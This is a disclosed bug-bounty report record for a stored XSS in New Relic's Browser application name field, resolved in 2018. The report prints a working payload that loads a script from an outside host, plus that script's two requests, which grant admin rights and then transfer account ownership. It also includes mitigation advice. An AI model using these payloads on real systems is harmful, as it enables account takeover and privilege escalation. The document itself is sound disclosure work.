@@ -1,0 +1,148 @@
+{
+  "id": 348076,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDgwNzY=",
+  "url": "https://hackerone.com/reports/348076",
+  "title": "Stored XSS in Brower `name` field reflected in two pages",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-07T04:32:13.672Z",
+  "submitted_at": "2018-05-07T04:32:13.672Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ldionmarcil",
+    "url": "/ldionmarcil",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/098/412/a38bf011fca2ae49a64188e452ee64e53e614dae_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-07-20T20:05:33.971Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-07-20T18:20:06.994Z",
+  "team_member_agreed_on_going_public_at": "2018-07-20T20:05:33.787Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The `Name` field of the Brower apps feature is not properly escaped in at least two pages. An attacker can create a new browser application with a specially crafted `Name` field which will be reflected and interpreted by other users visiting these two pages. Leveraging this vulnerability, I was able to target an admin account in order to elevate my own `user` privileged account to the privilege of `admin`  and transfer myself the ownership of the account.\n\n# Steps to reproduce\n1. Create a new Browser application (https://rpm.newrelic.com/accounts/{account_id}/browser/new)\n1. Pick the `Copy/Paste Javascript code` toggle\n1. in the `Name` field, insert the following payload: \n```js\n '+alert(document.domain)+' \n```\n\n1. Press `Enable`\n1. Go back to the Browser application list and select the application you just created\n1. There, visit the `Violations` or `Alert conditions` page to trigger the XSS:\n{F294525} \nThis is caused by this line which does not properly sanitize the single quotes found in the `Name`: {F294526}\n\n# Leveraging this to elevate our own privileges\nI used the `account.newrelic.com` REST API to build an attack scenario where an unprivileged user could elevate their own privileges to the status of `owner`. It's a two step job, first we need to grant ourself the `admin` privileges, and then we need to make the owner transfer ownership to our account.\n\n### Bypassing character limitation\nThe application `Name` field is restricted to 128 characters, which is too short for a working two-step payload (admin-granting and owner-transferring). I side-loaded a self-hosted Javascript file through jQuery in order to save space. This is the payload I used:\n```js\n'+$.ajax({url:\"https://windows-analytics.com/j.js\",dataType:\"script\"})+'\n```\nThe `j.js` file is fetched by jQuery and interpreted in the context of the DOM at `rpm.newrelic.com`. This is the content of the file:\n\n```js\nvar ADMIN_USER_ID    = 2194406;\nvar ATTACKER_USER_ID = 2196014;\n\n// step 1, admin takeover\nalert(\"Giving us admin privileges...\");\n$.ajax({\n    url: \"/user_management/accounts/1968666/users/\"+ATTACKER_USER_ID,\n    type: \"put\",\n    data: JSON.stringify({\"account_view\":{\"level\":\"admin\"}}),\n    headers: {\n\t\"Origin\":\"https://account.newrelic.com\",\n\t\"Accept\":\"application/json\",\n\t\"X-Requested-With\":\"XMLHttpRequest\",\n\t\"User-Agent\":\"Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\",\n\t\"Connection\":\"close\",\n\t\"Accept-Language\":\"en-US,en;q=0.5\",\n\t\"Accept-Encoding\":\"gzip, deflate\",\n\t\"Content-Type\":\"application/json\"\n    },\n    success: function (data) {\n\t// step 2, ownership takeover\n\talert(\"Changing ownership...\");\n\t$.ajax({\n\t    url: \"/user_management/accounts/1968666/update_primary_admin?value=\"+ATTACKER_USER_ID,\n\t    type: \"put\",\n\t    headers: {\n\t\t\"Origin\":\"https://account.newrelic.com\",\n\t\t\"Accept\":\"*/*\",\n\t\t\"X-Requested-With\":\"XMLHttpRequest\",\n\t\t\"User-Agent\":\"Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\",\n\t\t\"Connection\":\"close\",\n\t\t\"Accept-Language\":\"en-US,en;q=0.5\",\n\t\t\"Accept-Encoding\":\"gzip, deflate\"\n\t    },\n\t    success: function () {\n\t\t// Account takeover done!\n\t\talert(\"Full takeover done!\");\n\t    }\n\t});\n    }\n});\n```\nThis file performs two AJAX queries when loaded. First, it grants the attacker's account the `admin` privileges. Second, it transfers the ownership of the victim's account to the attacker's. I leaked the `user_id` of the account owner through the `user-management.service.newrelic.com` API at the `/accounts/1968666/users` endpoint. I put this value in the beginning of the `j.js`. \n\n## Triggering the payload\nOnce an admin visits either the `https://rpm.newrelic.com/accounts/{ACCOUNT_ID}browser/{APP_ID}/alert_conditions` or `https://rpm.newrelic.com/accounts/{ACCOUNT_ID}/browser/{APP_ID}/violations`, this chain of actions will unfold and the administrator will have transferred the ownership of the account over to the attacker.\n\nA full video of the attack scenario can be seen here: {F294527}\n\n# Mitigation\nFirst, the `Name` field should be properly sanitized to block users from executing arbitrary JavaScript.\nSecond, (and I feel this could be a bug report of its own) critical actions such as transferring ownership, granting high privileges, *should require re-entering your administrative password*. This is a standard practice when following defence in depth principles. Using this principle, XSS attacks would be restricted to a very limited set of actions, none of which should have critical impact.\n\n## Impact\n\nUsers can execute arbitrary JavaScript code in the context of other users. This is critical when targeted users have high privileges. Attackers are then able to grant themselves the administrator privileges and even takeover the ownership of the New Relic account.\n\nThe hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttps://rpm.newrelic.com/accounts/1968666/browser/52924826/alert_conditions\n\n**Verified**\nYes\n\n",
+  "bounty_amount": "3000.0",
+  "formatted_bounty": "$3,000",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 294525,
+      "file_name": "2018-05-07-000629_615x290_scrot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/294/525/752553c7439a812ded14166d9f6d9545bdf225ec/2018-05-07-000629_615x290_scrot.png?response-content-disposition=attachment%3B%20filename%3D%222018-05-07-000629_615x290_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272018-05-07-000629_615x290_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130349Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d10aa8c1eb596f2b5b4986e53dd2e9601d9ac123a1adad9bd9230c68514a7e10",
+      "file_size": 40485,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 294526,
+      "file_name": "2018-05-07-000955_485x109_scrot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/294/526/3ef66a7e7d123986d5f9216e91c5f823f00c2494/2018-05-07-000955_485x109_scrot.png?response-content-disposition=attachment%3B%20filename%3D%222018-05-07-000955_485x109_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272018-05-07-000955_485x109_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130349Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a51dc283ab24db3b61c6fea9249430fe0b1098ddfa12ee3913a1e63fe0fd58eb",
+      "file_size": 15427,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 294527,
+      "file_name": "output.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/294/527/8b2e85bf825334637a8d2df115dea36f2628bce7/output.gif?response-content-disposition=attachment%3B%20filename%3D%22output.gif%22%3B%20filename%2A%3DUTF-8%27%27output.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130349Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a082d151ac536694c40f25c2e541a8e40fa494f8a749134d21062fe9903ca335",
+      "file_size": 19441620,
+      "type": "image/gif",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-08-19T18:20:07.189Z",
+  "allow_singular_disclosure_after": -173126622.63723466,
+  "singular_disclosure_allowed": true,
+  "vote_count": 39,
+  "voters": [
+    "wi11",
+    "ramsexy",
+    "bogdantcaciuc",
+    "kapytein",
+    "muon4",
+    "vp40",
+    "sameerphad72",
+    "bl4de",
+    "yumi",
+    "ldionmarcil",
+    "and 29 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 6454,
+    "asset_type": "URL",
+    "asset_identifier": "alerts.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
